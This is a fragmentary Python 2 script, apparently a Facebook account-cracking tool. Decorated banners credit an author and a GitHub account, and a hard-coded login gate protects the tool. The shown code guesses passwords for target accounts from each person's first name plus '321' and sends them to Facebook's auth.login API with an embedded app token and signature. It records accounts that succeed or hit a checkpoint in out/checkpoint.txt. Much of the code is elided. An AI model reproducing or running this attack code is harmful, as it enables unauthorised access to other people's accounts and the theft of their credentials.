...
|__~~~\ •◈•-----█-------Bangladesh -------█------•◈•
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mALEX BIFER
\033[1;96mInstagram \033[1;93m: \033[1;LOVE
\033[1;96mFacebook  \033[1;93m: \033[1; BANGLADESH 
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/JAHINNAGAR
\033[1;91m======================================="""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mLog in \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
...
print  """\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mALEX BIFER
\033[1;96mInstagram \033[1;93m: \033[1;92mLOVE
\033[1;96mFacebook  \033[1;93m: \033[1;92m BANGLADESH 
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/JAHINNAGAR
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="

CorrectUsername = "ALEX"
CorrectPassword = "BIFER"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://www.youtube.com/channel/UCntpyOkaXx8OKTYoitC7Gbg')
    else:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															cekpoint.append(user+pass6)
												                ...
												                passC = b['first_name'] + '321'
													            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(passC)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													            q = json.load(data)
													            if 'access_token' in q:
														            print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + passC
														            oks.append(user+passC)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + passC
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+passC+"\n")
															cek.close()
															cekpoint.append(user+passC)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
